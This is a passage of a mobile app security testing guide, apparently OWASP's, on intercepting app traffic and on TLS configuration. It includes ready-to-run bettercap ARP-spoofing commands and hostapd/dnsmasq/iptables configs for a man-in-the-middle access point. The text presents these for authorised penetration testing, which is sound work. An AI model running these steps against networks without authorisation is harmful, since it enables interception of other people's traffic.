\hypertarget{burp-plugins-to-process-non-http-traffic}{%
\subsubsection{Burp plugins to Process Non-HTTP
Traffic}\label{burp-plugins-to-process-non-http-traffic}}

Interception proxies such as Burp and OWASP ZAP won't show non-HTTP
traffic, because they aren't capable of decoding it properly by default.
There are, however, Burp plugins available such as:

\begin{itemize}
\tightlist
\item
  \href{https://github.com/summitt/Burp-Non-HTTP-Extension}{Burp-non-HTTP-Extension}
  and
\item
  \href{https://github.com/jrmdev/mitm_relay}{Mitm-relay}.
\end{itemize}

These plugins can visualize non-HTTP protocols and you will also be able
to intercept and manipulate the traffic.

Note that this setup can sometimes become very tedious and is not as
straightforward as testing HTTP.

\hypertarget{intercepting-traffic-on-the-network-layer}{%
\subsubsection{Intercepting Traffic on the Network
Layer}\label{intercepting-traffic-on-the-network-layer}}

Dynamic analysis by using an interception proxy can be straight forward
if standard libraries are used in the app and all communication is done
via HTTP. But there are several cases where this is not working:

\begin{itemize}
\tightlist
\item
  If mobile application development platforms like
  \href{https://www.xamarin.com/platform}{Xamarin} are used that ignore
  the system proxy settings;
\item
  If mobile applications verify if the system proxy is used and refuse
  to send requests through a proxy;
\item
  If you want to intercept push notifications, like for example GCM/FCM
  on Android;
\item
  If XMPP or other non-HTTP protocols are used.
\end{itemize}

In these cases you need to monitor and analyze the network traffic first
in order to decide what to do next. Luckily, there are several options
for redirecting and intercepting network communication:

\begin{itemize}
\item
  Route the traffic through the host machine. You can set up your
  machine as the network gateway, e.g.~by using the built-in Internet
  Sharing facilities of your operating system. You can then use
  \href{https://www.wireshark.org}{Wireshark} to sniff any traffic from
  the mobile device;
\item
  Sometimes you need to execute a MITM attack to force the mobile device
  to talk to you. For this scenario you should consider
  \href{https://github.com/bettercap/bettercap}{bettercap} or use your
  own access point to redirect network traffic from the mobile device to
  your host machine (see below);
\end{itemize}

\begin{quote}
bettercap is a powerful tool to execute MITM attacks and should be
preferred nowadays, instead of ettercap. See also
\href{https://www.bettercap.org/legacy/\#why-another-mitm-tool}{Why
another MITM tool?} on the bettercap site.
\end{quote}

\begin{itemize}
\item
  On a rooted device, you can use hooking or code injection to intercept
  network-related API calls (e.g.~HTTP requests) and dump or even
  manipulate the arguments of these calls. This eliminates the need to
  inspect the actual network data. We'll talk in more detail about these
  techniques in the ``Reverse Engineering and Tampering'' chapters;
\item
  On macOS, you can create a ``Remote Virtual Interface'' for sniffing
  all traffic on an iOS device. We'll describe this method in the
  chapter ``Basic Security Testing on iOS''.
\end{itemize}

\hypertarget{simulating-a-man-in-the-middle-attack-with-bettercap}{%
\paragraph{Simulating a Man-in-the-Middle Attack with
bettercap}\label{simulating-a-man-in-the-middle-attack-with-bettercap}}

\hypertarget{network-setup}{%
\subparagraph{Network Setup}\label{network-setup}}

To be able to get a man-in-the-middle position your machine should be in
the same wireless network as the mobile phone and the gateway it
communicates to. Once this is done you need the IP address of your
mobile phone.

\href{https://github.com/bettercap/bettercap}{bettercap} can be used
during network penetration tests in order to simulate a
man-in-the-middle (MITM) attack. This is achieved by executing
\href{https://en.wikipedia.org/wiki/ARP_spoofing}{ARP poisoning or
spoofing} to the target machines. When such an attack is successful, all
packets between two machines are redirected to a third machine that acts
as the man-in-the-middle and is able to intercept the traffic for
analysis.

For a full dynamic analysis of a mobile app, all network traffic should
be intercepted. To be able to intercept the messages several steps
should be considered for preparation.

\hypertarget{bettercap-installation}{%
\subparagraph{bettercap Installation}\label{bettercap-installation}}

bettercap is available for all major Linux and Unix operating systems
and should be part of their respective package installation mechanisms.
You need to install it on your machine that will act as the MITM. On
macOS it can be installed by using brew.

\begin{verbatim}
$ brew install bettercap
\end{verbatim}

For Kali Linux you can install bettercap with \texttt{apt-get}:

\begin{verbatim}
$ apt-get update
$ apt-get install bettercap
\end{verbatim}

There are installation instructions as well for Ubuntu Linux 18.04 on
\href{https://linuxhint.com/install-bettercap-on-ubuntu-18-04-and-use-the-events-stream/}{LinuxHint}.

\hypertarget{arp-poisoning-with-bettercap}{%
\paragraph{ARP Poisoning with
bettercap}\label{arp-poisoning-with-bettercap}}

Start your preferred network analyzer tool first, then start bettercap
with the following command and replace the IP address below (X.X.X.X)
with the target you want to execute the MITM attack against.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\FunctionTok{sudo}\NormalTok{ bettercap {-}eval }\StringTok{"set arp.spoof.targets X.X.X.X; arp.spoof on; set arp.spoof.internal true; set arp.spoof.fullduplex true;"}
\ExtensionTok{bettercap}\NormalTok{ v2.22 (built for darwin amd64 with go1.12.1) [}\ExtensionTok{type} \StringTok{\textquotesingle{}help\textquotesingle{}}\NormalTok{ for a list of commands]}

\NormalTok{[}\ExtensionTok{19}\NormalTok{:21:39] [sys.log] [inf] arp.spoof enabling forwarding}
\NormalTok{[}\ExtensionTok{19}\NormalTok{:21:39] [sys.log] [inf] arp.spoof arp spoofer started, probing 1 targets.}
\end{Highlighting}
\end{Shaded}

bettercap will then automatically send the packets to the network
gateway in the (wireless) network and you are able to sniff the traffic.
Beginning of 2019 support for
\href{https://github.com/bettercap/bettercap/issues/426}{full duplex ARP
spoofing} was added to bettercap.

On the mobile phone start the browser and navigate to
\texttt{http://example.com}, you should see output like the following
when you are using Wireshark.

\begin{figure}
\centering
\includegraphics{/tmp/tex2pdf.-b81d3c9506d190f0/c3af2e2ee692b1d4abd115bece49476248ffa13d.png}
\caption{Wireshark}
\end{figure}

If that's the case, you are now able to see the complete network traffic
that is sent and received by the mobile phone. This includes also DNS,
DHCP and any other form of communication and can therefore be quite
``noisy''. You should therefore know how to use
\href{https://wiki.wireshark.org/DisplayFilters}{DisplayFilters in
Wireshark} or know
\href{https://danielmiessler.com/study/tcpdump/\#gs.OVQjKbk}{how to
filter in tcpdump} to focus only on the relevant traffic for you.

\begin{quote}
Man-in-the-middle attacks work against any device and operating system
as the attack is executed on OSI Layer 2 through ARP Spoofing. When you
are MITM you might not be able to see clear text data, as the data in
transit might be encrypted by using TLS, but it will give you valuable
information about the hosts involved, the protocols used and the ports
the app is communicating with.
\end{quote}

\hypertarget{simulating-a-man-in-the-middle-attack-with-an-access-point}{%
\paragraph{Simulating a Man-in-the-Middle Attack with an access
point}\label{simulating-a-man-in-the-middle-attack-with-an-access-point}}

\hypertarget{network-setup-1}{%
\subparagraph{Network Setup}\label{network-setup-1}}

A simple way to simulate a man-in-the-middle (MITM) attack is to
configure a network where all packets between the devices in scope and
the target network are going through your machine. In a mobile
penetration test, this can be achieved by using an access point the
mobile devices and your machine are connected to. Your machine is then
becoming a router and an access point.

Following scenarios are possible:

\begin{itemize}
\tightlist
\item
  Use your machine's built-in WiFi card as an access point and use your
  wired connection to connect to the target network.
\item
  Use an external USB WiFi card as an access point and user your machine
  built-in WiFi to connect to the target network (can be vice-versa).
\item
  Use a separate access point and redirect the traffic to your machine.
\end{itemize}

The scenario with an external USB WiFi card require that the card has
the capability to create an access point. Additionally, you need to
install some tools and/or configure the network to enforce a
man-in-the-middle position (see below). You can verify if your WiFi card
has AP capabilities by using the command \texttt{iwconfig} on Kali
Linux:

\begin{verbatim}
    $ iw list | grep AP
\end{verbatim}

The scenario with a separate access point requires access to the
configuration of the AP and you should check first if the AP supports
either:

\begin{itemize}
\tightlist
\item
  port forwarding or
\item
  has a span or mirror port.
\end{itemize}

In both cases the AP needs to be configured to point to your machines
IP. Your machine must be connected to the AP (via wired connection or
WiFi) and you need to have connection to the target network (can be the
same connection as to the AP). Some additional configuration may be
required on your machine to route traffic to the target network.

\begin{quote}
If the separate access point belongs to the customer, all changes and
configurations should be clarified prior to the engagement and a backup
should be created, before making any changes.
\end{quote}

\begin{figure}
\centering
\includegraphics{/tmp/tex2pdf.-b81d3c9506d190f0/23e89c95e9bb3113d34778f0cba467e2ded7bdb9.png}
\caption{Network Diagram - MITM with an access point}
\end{figure}

\hypertarget{installation}{%
\subparagraph{Installation}\label{installation}}

The following procedure is setting up a man-in-the-middle position using
an access point and an additional network interface:

Create a WiFi network either through a separate access point or through
an external USB WiFi card or through the built-in card of your machine.

This can be done by using the built-in utilities on macOS. You can use
\href{https://support.apple.com/en-ke/guide/mac-help/mchlp1540/mac}{share
the internet connection on Mac with other network users}.

For all major Linux and Unix operating systems you need tools such as:

\begin{itemize}
\tightlist
\item
  hostapd,
\item
  dnsmasq,
\item
  iptables,
\item
  wpa\_supplicant,
\item
  airmon-ng.
\end{itemize}

For Kali Linux you can install these tools with \texttt{apt-get}:

\begin{verbatim}
$ apt-get update
$ apt-get install hostapd dnsmasq aircrack-ng
\end{verbatim}

\begin{quote}
iptables and wpa\_supplicant are installed by default on Kali Linux.
\end{quote}

In case of a separate access point, route the traffic to your machine.
In case of an external USB WiFi card or built-in WiFi card the traffic
is already available on your machine.

Route the incoming traffic coming from the WiFi to the additional
network interface where the traffic can reach the target network.
Additional network interface can be wired connection or other WiFi card,
depending on your setup.

\hypertarget{configuration}{%
\subparagraph{Configuration}\label{configuration}}

We focus on the configuration files for Kali Linux. Following values
need to be defined:

\begin{itemize}
\tightlist
\item
  wlan1 - id of the AP network interface (with AP capabilities),
\item
  wlan0 - id of the target network interface (this can be wired
  interface or other WiFi card)
\item
  10.0.0.0/24 - IP addresses and mask of AP network
\end{itemize}

The following configuration files need to be changed and adjusted
accordingly:

\begin{itemize}
\item
  hostapd.conf

\begin{verbatim}
# Name of the WiFi interface we use
interface=wlan1
# Use the nl80211 driver
driver=nl80211
hw_mode=g
channel=6
wmm_enabled=1
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
# Name of the AP network
ssid=STM-AP
# Password of the AP network
wpa_passphrase=password
\end{verbatim}
\item
  wpa\_supplicant.conf

\begin{verbatim}
network={
    ssid="NAME_OF_THE_TARGET_NETWORK"
    psk="PASSWORD_OF_THE_TARGET_NETWORK"
}
\end{verbatim}
\item
  dnsmasq.conf

\begin{verbatim}
interface=wlan1
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
\end{verbatim}
\end{itemize}

\hypertarget{mitm-attack}{%
\subparagraph{MITM Attack}\label{mitm-attack}}

To be able to get a man-in-the-middle position you need to run the above
configuration. This can be done by using the following commands on Kali
Linux:

\begin{verbatim}
    # check if other process is not using WiFi interfaces
    $ airmon-ng check kill
    # configure IP address of the AP network interface
    $ ifconfig wlan1 10.0.0.1 up
    # start access point
    $ hostapd hostapd.conf
    # connect the target network interface
    $ wpa_supplicant -B -i wlan0 -c wpa_supplicant.conf
    # run DNS server
    $ dnsmasq -C dnsmasq.conf -d
    # enable routing
    $ echo 1 > /proc/sys/net/ipv4/ip_forward
    # iptables will NAT connections from AP network interface to the target network interface
    $ iptables --flush
    $ iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE
    $ iptables --append FORWARD --in-interface wlan1 -j ACCEPT
    $ iptables -t nat -A POSTROUTING -j MASQUERADE
\end{verbatim}

Now you can connect your mobile devices to the access point.

\hypertarget{network-analyzer-tool}{%
\paragraph{Network Analyzer Tool}\label{network-analyzer-tool}}

Install a tool that allows you to monitor and analyze the network
traffic that will be redirected to your machine. The two most common
network monitoring (or capturing) tools are:

\begin{itemize}
\tightlist
\item
  \href{https://www.wireshark.org}{Wireshark} (CLI pendant:
  \href{https://www.wireshark.org/docs/man-pages/tshark.html}{TShark})
\item
  \href{https://www.tcpdump.org/tcpdump_man.html}{tcpdump}
\end{itemize}

Wireshark offers a GUI and is more straightforward if you are not used
to the command line. If you are looking for a command line tool you
should either use TShark or tcpdump. All of these tools are available
for all major Linux and Unix operating systems and should be part of
their respective package installation mechanisms.

\hypertarget{setting-a-proxy-through-runtime-instrumentation}{%
\paragraph{Setting a Proxy Through Runtime
Instrumentation}\label{setting-a-proxy-through-runtime-instrumentation}}

On a rooted or jailbroken device, you can also use runtime hooking to
set a new proxy or redirect network traffic. This can be achieved with
hooking tools like
\href{https://github.com/ac-pm/Inspeckage}{Inspeckage} or code injection
frameworks like \href{https://www.frida.re}{Frida} and
\href{http://www.cycript.org}{cycript}. You'll find more information
about runtime instrumentation in the ``Reverse Engineering and
Tampering'' chapters of this guide.

\hypertarget{example---dealing-with-xamarin}{%
\paragraph{Example - Dealing with
Xamarin}\label{example---dealing-with-xamarin}}

As an example, we will now redirect all requests from a Xamarin app to
an interception proxy.

Xamarin is a mobile application development platform that is capable of
producing
\href{https://developer.xamarin.com/guides/android/getting_started/}{native
Android} and \href{https://developer.xamarin.com/guides/ios/}{iOS apps}
by using Visual Studio and C\# as programming language.

When testing a Xamarin app and when you are trying to set the system
proxy in the Wi-Fi settings you won't be able to see any HTTP requests
in your interception proxy, as the apps created by Xamarin do not use
the local proxy settings of your phone. There are three ways to resolve
this:

\begin{itemize}
\item
  Add a
  \href{https://developer.xamarin.com/api/type/System.Net.WebProxy/}{default
  proxy to the app}, by adding the following code in the
  \texttt{OnCreate} or \texttt{Main} method and re-create the app:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{WebRequest.}\FunctionTok{DefaultWebProxy}\NormalTok{ = }\KeywordTok{new} \FunctionTok{WebProxy}\NormalTok{(}\StringTok{"192.168.11.1"}\NormalTok{, }\DecValTok{8080}\NormalTok{);}
\end{Highlighting}
\end{Shaded}
\item
  Use bettercap in order to get a man-in-the-middle position (MITM), see
  the section above about how to setup a MITM attack. When being MITM
  you only need to redirect port 443 to your interception proxy running
  on localhost. This can be done by using the command \texttt{rdr} on
  macOS:
\end{itemize}

\begin{verbatim}
    $ echo "
    rdr pass inet proto tcp from any to any port 443 -> 127.0.0.1 port 8080
    " | sudo pfctl -ef -
\end{verbatim}

For Linux systems you can use \texttt{iptables}:

\begin{verbatim}
    $ sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 127.0.0.1:8080
\end{verbatim}

As last step, you need to set the option `Support invisible proxy' in
the listener settings of Burp Suite.

\begin{itemize}
\tightlist
\item
  Instead of bettercap an alternative is tweaking the
  \texttt{/etc/hosts} on the mobile phone. Add an entry into
  \texttt{/etc/hosts} for the target domain and point it to the IP
  address of your intercepting proxy. This creates a similar situation
  of being MiTM as with bettercap and you need to redirect port 443 to
  the port which is used by your interception proxy. The redirection can
  be applied as mentioned above. Additionally, you need to redirect
  traffic from your interception proxy to the original location and
  port.
\end{itemize}

\begin{quote}
When redirecting traffic you should create narrow rules to the domains
and IPs in scope, to minimize noise and out-of-scope traffic.
\end{quote}

The interception proxy need to listen to the port specified in the port
forwarding rule above, which is 8080.

When a Xamarin app is configured to use a proxy (e.g.~by using
\texttt{WebRequest.DefaultWebProxy}) you need to specify where traffic
should go next, after redirecting the traffic to your intercepting
proxy. You need to redirect the traffic to the original location. The
following procedure is setting up a redirection in Burp to the original
location:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  Go to \textbf{Proxy} tab and click on \textbf{Options}
\item
  Select and edit your listener from the list of proxy listeners.
\item
  Go to \textbf{Request handling} tab and set:

  \begin{itemize}
  \tightlist
  \item
    Redirect to host: provide original traffic location
  \item
    Redirect to port: provide original port location
  \item
    Set `Force use of SSL' (when HTTPS is used) and set `Support
    invisible proxy'.
  \end{itemize}
\end{enumerate}

\begin{figure}
\centering
\includegraphics[width=6.25in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/db6c108c5b7ef9e975feeffbd8dfd088fe39edea.png}
\caption{Burp redirect to original location}
\end{figure}

\hypertarget{ca-certificates}{%
\subparagraph{CA Certificates}\label{ca-certificates}}

If not already done, install the CA certificates in your mobile device
which will allow us to intercept HTTPS requests:

\begin{itemize}
\tightlist
\item
  \href{https://support.portswigger.net/customer/portal/articles/1841102-installing-burp-s-ca-certificate-in-an-android-device}{Install
  the CA certificate of your interception proxy into your Android phone}
  \textgreater{} Note that starting with Android 7.0 (API level 24) the
  OS no longer trusts a user supplied CA certificate unless specified in
  the app. Bypassing this security measure will be addressed in the
  ``Basic Security Testing'' chapters.
\item
  \href{https://support.portswigger.net/customer/portal/articles/1841108-configuring-an-ios-device-to-work-with-burp}{Install
  the CA certificate of your interception proxy into your iOS phone}
\end{itemize}

\hypertarget{intercepting-traffic}{%
\subparagraph{Intercepting Traffic}\label{intercepting-traffic}}

Start using the app and trigger it's functions. You should see HTTP
messages showing up in your interception proxy.

\begin{quote}
When using bettercap you need to activate ``Support invisible proxying''
in Proxy Tab / Options / Edit Interface
\end{quote}

\hypertarget{verifying-data-encryption-on-the-network-mstg-network-1-and-mstg-network-2}{%
\subsubsection{Verifying Data Encryption on the Network (MSTG-NETWORK-1
and
MSTG-NETWORK-2)}\label{verifying-data-encryption-on-the-network-mstg-network-1-and-mstg-network-2}}

\hypertarget{overview-2}{%
\paragraph{Overview}\label{overview-2}}

One of the core mobile app functions is sending/receiving data over
untrusted networks like the Internet. If the data is not properly
protected in transit, an attacker with access to any part of the network
infrastructure (e.g., a Wi-Fi access point) may intercept, read, or
modify it. This is why plaintext network protocols are rarely advisable.

The vast majority of apps rely on HTTP for communication with the
backend. HTTPS wraps HTTP in an encrypted connection (the acronym HTTPS
originally referred to HTTP over Secure Socket Layer (SSL); SSL is the
deprecated predecessor of TLS). TLS allows authentication of the backend
service and ensures confidentiality and integrity of the network data.

\hypertarget{recommended-tls-settings}{%
\subparagraph{Recommended TLS Settings}\label{recommended-tls-settings}}

Ensuring proper TLS configuration on the server side is also important.
The SSL protocol is deprecated and should no longer be used. Also TLS
v1.0 and TLS v1.1 have
\href{https://portswigger.net/daily-swig/the-end-is-nigh-browser-makers-ditch-support-for-aging-tls-1-0-1-1-protocols}{known
vulnerabilities} and their usage is deprecated in all major browsers by
2020. TLS v1.2 and TLS v1.3 are considered best practice for secure
transmission of data. Starting with Android 10 (API level 29) TLS v1.3
will be enabled by default for faster and secure communication. The
\href{https://developer.android.com/about/versions/10/behavior-changes-all\#tls-1.3}{major
change with TLS v1.3} is that customizing cipher suites is no longer
possible and that all of them are enabled when TLS v1.3 is enabled,
whereas Zero Round Trip (0-RTT) mode isn't supported.

When both the client and server are controlled by the same organization
and used only for communicating with one another, you can increase
security by
\href{https://dev.ssllabs.com/projects/best-practices/}{hardening the
configuration}.

If a mobile application connects to a specific server, its networking
stack can be tuned to ensure the highest possible security level for the
server's configuration. Lack of support in the underlying operating
system may force the mobile application to use a weaker configuration.

Cipher Suites Terminology

Cipher suites have the following structure:
\textbf{Protocol\_KeyExchangeAlgorithm\_WITH\_BlockCipher\_IntegrityCheckAlgorithm}

This structure can be described as follows:

\begin{itemize}
\tightlist
\item
  The Protocol the cipher uses
\item
  The key Exchange Algorithm used by the server and the client to
  authenticate during the TLS handshake
\item
  The block cipher used to encrypt the message stream
\item
  Integrity check algorithm used to authenticate messages
\end{itemize}

Example: \texttt{TLS\_RSA\_WITH\_3DES\_EDE\_CBC\_SHA}

In the example above the cipher suites uses:

\begin{itemize}
\tightlist
\item
  TLS as protocol
\item
  RSA Asymmetric encryption for Authentication
\item
  3DES for Symmetric encryption with EDE\_CBC mode
\item
  SHA Hash algorithm for integrity
\end{itemize}

Note that in TLSv1.3 the KeyExchangeAlgorithm is not part of the cipher
suite, instead it is determined during the TLS handshake.

In the following listing, we'll present the different algorithms of each
part of the cipher suite.

Protocols:

\begin{itemize}
\tightlist
\item
  \texttt{SSLv1}
\item
  \texttt{SSLv2} - \href{https://tools.ietf.org/html/rfc6176}{RFC 6176}
\item
  \texttt{SSLv3} - \href{https://tools.ietf.org/html/rfc6101}{RFC 6101}
\item
  \texttt{TLSv1.0} - \href{https://www.ietf.org/rfc/rfc2246}{RFC 2246}
\item
  \texttt{TLSv1.1} - \href{https://tools.ietf.org/html/rfc4346}{RFC
  4346}
\item
  \texttt{TLSv1.2} - \href{https://tools.ietf.org/html/rfc5246}{RFC
  5246}
\item
  \texttt{TLSv1.3} - \href{https://tools.ietf.org/html/rfc8446}{RFC
  8446}
\end{itemize}

Key Exchange Algorithms:

\begin{itemize}
\tightlist
\item
  \texttt{DSA} - \href{https://tools.ietf.org/html/rfc6979}{RFC 6979}
\item
  \texttt{ECDSA} - \href{https://tools.ietf.org/html/rfc6979}{RFC 6979}
\item
  \texttt{RSA} - \href{https://tools.ietf.org/html/rfc8017}{RFC 8017}
\item
  \texttt{DHE} - \href{https://tools.ietf.org/html/rfc2631}{RFC 2631} -
  \href{https://tools.ietf.org/html/rfc7919}{RFC 7919}
\item
  \texttt{ECDHE} - \href{https://tools.ietf.org/html/rfc4492}{RFC 4492}
\item
  \texttt{PSK} - \href{https://tools.ietf.org/html/rfc4279}{RFC 4279}
\item
  \texttt{DSS} -
  \href{https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.186-4.pdf}{FIPS186-4}
\item
  \texttt{DH\_anon} - \href{https://tools.ietf.org/html/rfc2631}{RFC
  2631} - \href{https://tools.ietf.org/html/rfc7919}{RFC 7919}
\item
  \texttt{DHE\_RSA} - \href{https://tools.ietf.org/html/rfc2631}{RFC
  2631} - \href{https://tools.ietf.org/html/rfc7919}{RFC 7919}
\item
  \texttt{DHE\_DSS} - \href{https://tools.ietf.org/html/rfc2631}{RFC
  2631} - \href{https://tools.ietf.org/html/rfc7919}{RFC 7919}
\item
  \texttt{ECDHE\_ECDSA} - \href{https://tools.ietf.org/html/rfc8422}{RFC
  8422}
\item
  \texttt{ECDHE\_PSK} - \href{https://tools.ietf.org/html/rfc8422}{RFC
  8422} - \href{https://tools.ietf.org/html/rfc5489}{RFC 5489}
\item
  \texttt{ECDHE\_RSA} - \href{https://tools.ietf.org/html/rfc8422}{RFC
  8422}
\end{itemize}

Block Ciphers:

\begin{itemize}
\tightlist
\item
  \texttt{DES} - \href{https://tools.ietf.org/html/rfc4772}{RFC 4772}
\item
  \texttt{DES\_CBC} - \href{https://tools.ietf.org/html/rfc1829}{RFC
  1829}
\item
  \texttt{3DES} - \href{https://tools.ietf.org/html/rfc2420}{RFC 2420}
\item
  \texttt{3DES\_EDE\_CBC} -
  \href{https://tools.ietf.org/html/rfc2420}{RFC 2420}
\item
  \texttt{AES\_128\_CBC} -
  \href{https://tools.ietf.org/html/rfc3268}{RFC 3268}
\item
  \texttt{AES\_128\_GCM} -
  \href{https://tools.ietf.org/html/rfc5288}{RFC 5288}
\item
  \texttt{AES\_256\_CBC} -
  \href{https://tools.ietf.org/html/rfc3268}{RFC 3268}
\item
  \texttt{AES\_256\_GCM} -
  \href{https://tools.ietf.org/html/rfc5288}{RFC 5288}
\item
  \texttt{RC4\_40} - \href{https://tools.ietf.org/html/rfc7465}{RFC
  7465}
\item
  \texttt{RC4\_128} - \href{https://tools.ietf.org/html/rfc7465}{RFC
  7465}
\item
  \texttt{CHACHA20\_POLY1305} -
  \href{https://tools.ietf.org/html/rfc7905}{RFC 7905} -
  \href{https://tools.ietf.org/html/rfc7539}{RFC 7539}
\end{itemize}

Integrity Check Algorithms:

\begin{itemize}
\tightlist
\item
  \texttt{MD5} - \href{https://tools.ietf.org/html/rfc6151}{RFC 6151}
\item
  \texttt{SHA} - \href{https://tools.ietf.org/html/rfc6234}{RFC 6234}
\item
  \texttt{SHA256} - \href{https://tools.ietf.org/html/rfc6234}{RFC 6234}
\item
  \texttt{SHA384} - \href{https://tools.ietf.org/html/rfc6234}{RFC 6234}
\end{itemize}

Note that The efficiency of a cipher suite depends on the efficiency of
its algorithms.

In the following, we'll present the updated recommended cipher suites
list to use with TLS. These cipher suites are recommended by both IANA
in its TLS parameters documentation and OWASP TLS Cipher String Cheat
Sheet:

\begin{itemize}
\tightlist
\item
  IANA recommended cipher suites can be found in
  \href{https://www.iana.org/assignments/tls-parameters/tls-parameters.xhtml\#tls-parameters-4}{TLS
  Cipher Suites}.
\item
  OWASP recommended cipher suites can be found in the
  \href{https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/TLS_Cipher_String_Cheat_Sheet.md}{TLS
  Cipher String Cheat Sheet}.
\end{itemize}

Note that in Android 10 the following
\href{https://developer.android.com/about/versions/10/behavior-changes-all\#sha2-cbc-cipher-suites}{SHA-2
CBC cipher suites have been removed}:

\begin{itemize}
\tightlist
\item
  \texttt{TLS\_RSA\_WITH\_AES\_128\_CBC\_SHA256}
\item
  \texttt{TLS\_RSA\_WITH\_AES\_256\_CBC\_SHA256}
\item
  \texttt{TLS\_ECDHE\_ECDSA\_WITH\_AES\_128\_CBC\_SHA256}
\item
  \texttt{TLS\_ECDHE\_ECDSA\_WITH\_AES\_256\_CBC\_SHA384}
\item
  \texttt{TLS\_ECDHE\_RSA\_WITH\_AES\_128\_CBC\_SHA256}
\item
  \texttt{TLS\_ECDHE\_RSA\_WITH\_AES\_256\_CBC\_SHA384}
\end{itemize}

Some Android and iOS versions do not support some of the recommended
cipher suites, so for compatibility purposes you can check the supported
cipher suites for
\href{https://developer.android.com/reference/javax/net/ssl/SSLSocket\#cipher-suites}{Android}
and
\href{https://developer.apple.com/documentation/security/1550981-ssl_cipher_suite_values?language=objc}{iOS}
versions and choose the top supported cipher suites.

\hypertarget{static-analysis-6}{%
\paragraph{Static Analysis}\label{static-analysis-6}}

Identify all API/web service requests in the source code and ensure that
no plain HTTP URLs are used. Make sure that sensitive information is
sent over secure channels by using
\href{https://developer.android.com/reference/javax/net/ssl/HttpsURLConnection.html}{HttpsURLConnection}
or
\href{https://developer.android.com/reference/javax/net/ssl/SSLSocket.html}{SSLSocket}
(for socket-level communication using TLS).

Be aware that \texttt{SSLSocket} \textbf{doesn't} verify the hostname.
Use \texttt{getDefaultHostnameVerifier} to verify the hostname. The
Android developer documentation includes a
\href{https://developer.android.com/training/articles/security-ssl.html\#WarningsSslSocket}{code
example}.

Verify that the server or termination proxy at which the HTTPS
connection terminates is configured according to best practices. See
also the
\href{https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.md}{OWASP
Transport Layer Protection cheat sheet} and the
\href{https://dev.ssllabs.com/projects/best-practices/}{Qualys SSL/TLS
Deployment Best Practices}.

\hypertarget{dynamic-analysis-4}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-4}}

Intercept the tested app's incoming and outgoing network traffic and
make sure that this traffic is encrypted. You can intercept network
traffic in any of the following ways:

\begin{itemize}
\tightlist
\item
  Capture all HTTP(S) and Websocket traffic with an interception proxy
  like OWASP ZAP or Burp Suite and make sure all requests are made via
  HTTPS instead of HTTP.
\item
  Interception proxies like Burp and OWASP ZAP will show HTTP(S) traffic
  only. You can, however, use a Burp plugin such as
  \href{https://github.com/summitt/Burp-Non-HTTP-Extension}{Burp-non-HTTP-Extension}
  or the tool \href{https://github.com/jrmdev/mitm_relay}{mitm-relay} to
  decode and visualize communication via XMPP and other protocols.
\end{itemize}

\begin{quote}
Some applications may not work with proxies like Burp and ZAP because of
Certificate Pinning. In such a scenario, please check ``Testing Custom
Certificate Stores and Certificate Pinning''.
\end{quote}

If you want to verify whether your server supports the right cipher
suites, there are various tools you can use:

\begin{itemize}
\tightlist
\item
  nscurl - see Testing Network Communication for iOS for more details.
\item
  \href{https://github.com/drwetter/testssl.sh}{testssl.sh} which ``is a
  free command line tool which checks a server's service on any port for
  the support of TLS/SSL ciphers, protocols as well as some
  cryptographic flaws''.
\end{itemize}

\hypertarget{making-sure-that-critical-operations-use-secure-communication-channels-mstg-network-5}{%
\subsubsection{Making Sure that Critical Operations Use Secure
Communication Channels
(MSTG-NETWORK-5)}\label{making-sure-that-critical-operations-use-secure-communication-channels-mstg-network-5}}

\hypertarget{overview-3}{%
\paragraph{Overview}\label{overview-3}}

For sensitive applications like banking apps,
\href{https://github.com/OWASP/owasp-masvs/blob/master/Document/0x03-Using_the_MASVS.md}{OWASP
MASVS} introduces ``Defense in Depth'' verification levels. The critical
operations (e.g., user enrolment and account recovery) of such
applications are some of the most attractive targets to attackers. This
requires implementation of advanced security controls, such as
additional channels to confirm user actions without relying on SMS or
email.

Note that using SMS as an additional factor for critical operations is
not recommended. Attacks like SIM swap scams were used in many cases to
\href{https://motherboard.vice.com/en_us/article/vbqax3/hackers-sim-swapping-steal-phone-numbers-instagram-bitcoin}{attack
Instagram accounts, cryptocurrency exchanges} and of course
\href{https://www.fintechnews.org/sim-swapping-how-the-mobile-security-feature-can-lead-to-a-hacked-bank-account/}{financial
institutions} to bypass SMS verification. SIM swapping is a legitimate
service offered by many carriers to switch your mobile number to a new
SIM card. If an attacker manages to either convince the carrier or
recruits retail workers at mobile shops to do a SIM swap, the mobile
number will be transferred to a SIM the attacker owns. As a result of
this, the attacker will be able to receive all SMS and voice calls
without the victim knowing it.

There are different ways to
\href{https://www.wired.com/story/sim-swap-attack-defend-phone/}{protect
your SIM card}, but this level of security maturity and awareness cannot
be expected from a normal user and is also not enforced by the carriers.

Also the usage of emails shouldn't be considered as a secure
communication channel. Encrypting emails is usually not offered by
service providers and even when available not used by the average user,
therefore the confidentiality of data when using emails cannot be
guaranteed. Spoofing, (spear\textbar dynamite) phishing and spamming are
additional ways to trick users by abusing emails. Therefore other secure
communication channels should be considered besides SMS and email.

\hypertarget{static-analysis-7}{%
\paragraph{Static Analysis}\label{static-analysis-7}}

Review the code and identify the parts that refer to critical
operations. Make sure that additional channels are used for such
operations. The following are examples of additional verification
channels:

\begin{itemize}
\tightlist
\item
  Token (e.g., RSA token, YubiKey),
\item
  Push notification (e.g., Google Prompt),
\item
  Data from another website you have visited or scanned (e.g.~QR code)
  or
\item
  Data from a physical letter or physical entry point (e.g., data you
  receive only after signing a document at a bank).
\end{itemize}

Make sure that critical operations enforce the use of at least one
additional channel to confirm user actions. These channels must not be
bypassed when executing critical operations. If you're going to
implement an additional factor to verify the user's identity, consider
also one-time passcodes (OTP) via
